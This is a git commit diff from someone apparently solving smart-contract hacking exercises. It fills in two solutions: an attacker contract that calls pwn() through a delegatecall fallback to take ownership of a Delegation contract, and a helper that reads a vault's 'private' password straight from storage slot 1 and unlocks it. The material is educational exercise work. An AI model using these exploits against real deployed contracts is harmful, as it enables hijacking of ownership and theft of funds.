eb77081a25ff496b14eb0edbe2646ee1287ec701
Akshay Ramaswamy <akshayramaswamy@Akshays-MacBook-Pro-2.local>
2022-06-22 14:45:14 -0400

    completed first four hacks

--- contracts/2. Delegation/AttackingDelegation.sol
+++ contracts/2. Delegation/AttackingDelegation.sol
@@ -6,10 +6,13 @@ contract AttackingDelegation {
     address public contractAddress;
 
     constructor(address _contractAddress) {
+        //delegation contract
         contractAddress = _contractAddress;
     }
 
     function hackContract() external {
         // Code me!
+        // we pass the pwn() function, and this is called in the fallback function since fallback is called if there is no identifiable function. Fallback forward the pwn() call to delegate because we use delegate call, and this sets the owner of the delegation contrat to be the attacker (delegatecall sets the vairables of the calling contract)
+        contractAddress.call(abi.encodeWithSignature("pwn()"));
     }
 }
--- contracts/4. Vault/VaultHelper.ts
+++ contracts/4. Vault/VaultHelper.ts
@@ -1,13 +1,10 @@
 import { expect } from "chai";
+import { providers } from "ethers";
 import { ethers, waffle } from "hardhat";
 
 const helper = async (victim: any) => {
-  /* 
-    Add code here that will help you pass the test
-    Note: Unlock without using the string "A very strong password"
-    Unlock the vault by somehow reading the private password from 
-    Vault directly
-  */
+  const hexPassword = await victim.provider.getStorageAt(victim.address, 1);
+  await victim.unlock(hexPassword);
 };
 
 export default helper;
